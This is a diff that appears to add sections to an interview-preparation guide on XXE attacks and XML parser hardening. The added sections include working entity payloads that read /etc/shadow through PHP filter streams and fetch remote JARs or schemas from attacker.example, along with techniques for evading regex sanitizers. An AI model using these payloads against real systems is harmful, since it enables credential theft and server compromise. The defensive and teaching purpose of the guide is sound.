@@ -197,6 +197,44 @@ Not exfiltration, a resource-exhaustion variant of the same "entities are danger
 
 Why it works: nested internal general entities expand multiplicatively (each level times ten), so `&lol9;` becomes roughly a billion characters and exhausts memory/CPU. The related "quadratic blowup" uses one huge entity referenced many times to dodge simple nesting-depth limits. Confirmation: the parser hangs or the process OOMs. Modern parsers cap entity expansion by default, but this is the canonical DoS to name.
 
+### 10. Base64-wrapped file read via PHP filter streams
+
+In-band file retrieval breaks whenever the target file contains characters that are not legal in XML text: raw `<`, raw `&`, `\x00`, or non-UTF-8 byte sequences all cause the parser to reject the substituted content or corrupt the response. The same content also blows up the OOB path because it fails URI character validation before the callback ever leaves. On PHP targets (libxml2 under the hood) the fix is to wrap the read in PHP's built-in filter stream so the file is base64-encoded before it is spliced into the document:
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/shadow">
+]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+```
+
+The reflected value is now clean base64 that decodes offline to the raw bytes. This is the go-to primitive for reading binary files (JAR/WAR archives, compiled objects, key material) and for reading PHP source itself (which contains `<?php` opening tags that would otherwise be interpreted by the parser). Related PHP wrappers worth naming when the target is PHP: `data://` embeds an inline data URI you can drive the parser into, `expect://` gives command execution when the `expect` extension is loaded, and `phar://` is a deserialization sink on older PHP through metadata unmarshalling. Interviewers reach for this when they ask "how would you read /etc/shadow or a compiled binary through XXE?" so name the wrapper by protocol, not just by effect.
+
+### 11. Java-specific URL handlers (jar://, netdoc://)
+
+Exploitation depends on the protocol handlers the runtime registers, not just on the XML spec. Java's default `URL` machinery ships a handful of handlers XML parsers will happily dereference, and they unlock primitives that `file://` alone does not:
+
+```xml
+<!ENTITY xxe SYSTEM "jar:file:///path/to/archive.jar!/inner.txt">
+<!ENTITY xxe SYSTEM "jar:http://attacker.example/x.jar!/file">
+<!ENTITY xxe SYSTEM "netdoc:///etc/">
+```
+
+`jar:file://...!/inner.txt` reads a single file from inside a ZIP or JAR on disk, useful when the target artifact is packaged rather than loose (web app WARs, signed JARs, Android APKs). `jar:http://.../x.jar!/file` is the interesting one: the JVM downloads the JAR to a temp file, extracts, and reads the inner path. If you keep the HTTP connection open (slow-drip the response so the archive never finishes downloading), the temp file lingers on disk with a predictable path, which is the documented XXE-to-file-upload technique from the Sharoglazov work: you have effectively written arbitrary bytes to the server's filesystem through an XML parser. `netdoc://` is a legacy Sun handler that returns directory listings on Java, enumerating directories which `file://` cannot. Naming these Java-specific handlers is a common senior probe because it separates candidates who understand "XXE is a URL fetch through the parser" from ones who only recognise the file-read syntax.
+
+### 12. Adjacent parser sinks: XSD schemaLocation and XSLT document()
+
+Two sinks sit right next to XXE and get bundled into the same interview question. First, schema loading: a validating parser that honors `xsi:schemaLocation` or `xsi:noNamespaceSchemaLocation` attributes on the document root will fetch the schema URL an attacker puts there. Even without any `DOCTYPE` this gives SSRF against the parser's network position, and on some stacks the fetched schema is itself processed with entity resolution, chaining back into classic file read.
+
+```xml
+<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+      xsi:noNamespaceSchemaLocation="http://attacker.example/steal.xsd">
+  ...
+</root>
+```
+
+Second, XSLT: if the server transforms XML using an attacker-controlled stylesheet, or applies a fixed stylesheet against attacker-controlled XML that calls `document()`, XSLT 1.0's `document()` function performs arbitrary URL fetches, and processors like Xalan and Saxon expose extension functions that reach into Java or the OS, giving full RCE rather than file read. The relevant JAXP hardening is different from the classic XXE knobs: set `ACCESS_EXTERNAL_SCHEMA=""` on `SchemaFactory`/`Validator`, `ACCESS_EXTERNAL_STYLESHEET=""` and `ACCESS_EXTERNAL_DTD=""` on `TransformerFactory`, and enable `FEATURE_SECURE_PROCESSING` to block extension-function abuse. Never let untrusted input flow into an XSLT transformer at all if you can avoid it. Interviewers use this to test whether you understand that "XML parser hardening" is a family of features across several factories, not one switch.
+
 ## Defense
 
 Ordered by effectiveness. The real fix is a parser configuration change, not input filtering.
@@ -288,6 +326,7 @@ tree = parse("data.xml")   # forbids DTDs and external entities by default
 - Why the malicious DTD must be external: the nested "entity inside another entity's definition" construction is legal only in an external DTD subset. That is exactly why the OOB exfil DTD is hosted remotely (or, when egress is blocked, why you repurpose a local DTD file and exploit the internal-redefines-external loophole).
 - Billion laughs is DoS, not data theft. Conflating it with exfiltration is a junior tell. It also does not need external anything: it is pure internal entity expansion.
 - "We validate/WAF the input" is a weak answer. XXE is fixed at the parser, not by blacklisting `<!ENTITY` or `SYSTEM`. Attackers obfuscate with XML encoding, `PUBLIC` identifiers, UTF-16, or the content-type flip. Only disabling DTDs/external entities is reliable.
+- Regex-stripping `<!DOCTYPE` / `<!ENTITY` / `SYSTEM` before parsing is a very common wrong answer, and every layer of the trap is worth naming: (1) re-encode the payload as UTF-16LE/UTF-16BE with the appropriate byte-order mark, or as UTF-7, and the ASCII regex never matches, but the parser still decodes and processes the DTD; (2) use the `PUBLIC` identifier form `<!DOCTYPE foo PUBLIC "-//x" "http://attacker.example/x.dtd">` to dodge filters keyed on `SYSTEM`; (3) split the declaration across whitespace, newlines, or XML comments that the parser tolerates but the regex was not tuned for; (4) route around the sanitizer with a content-type flip so the JSON-side scrubber never runs on the XML body; (5) inject into an OOXML/SVG inner XML part that the pre-processor did not unzip before scanning. Only parser-level configuration (`disallow-doctype-decl` or the equivalent for the stack) is reliable, because any lexical filter can be encoded around.
 - Disabling external entities but leaving DTDs enabled is a partial fix: it stops file reads but can still allow parameter-entity DoS and, on some parsers, local DTD repurposing. Forbidding the `DOCTYPE` entirely (`disallow-doctype-decl`) is strictly stronger.
 - Default safety varies by platform and version, and interviewers reward precision: libxml2 >= 2.9 safe by default, PHP >= 8.0 safe by default, .NET `XmlReader` safe from 4.5.2+, but `XmlDocument` unsafe before 4.5.2, and Java factories require patched JREs (7u67 / 8u20) for the countermeasures to actually hold.
 - The highest-value real-world XXE is often not the obvious XML API: it is an SVG/DOCX/XLSX upload, a SAML assertion, or a JSON endpoint that also parses XML. Naming these hidden sinks separates staff-level answers.
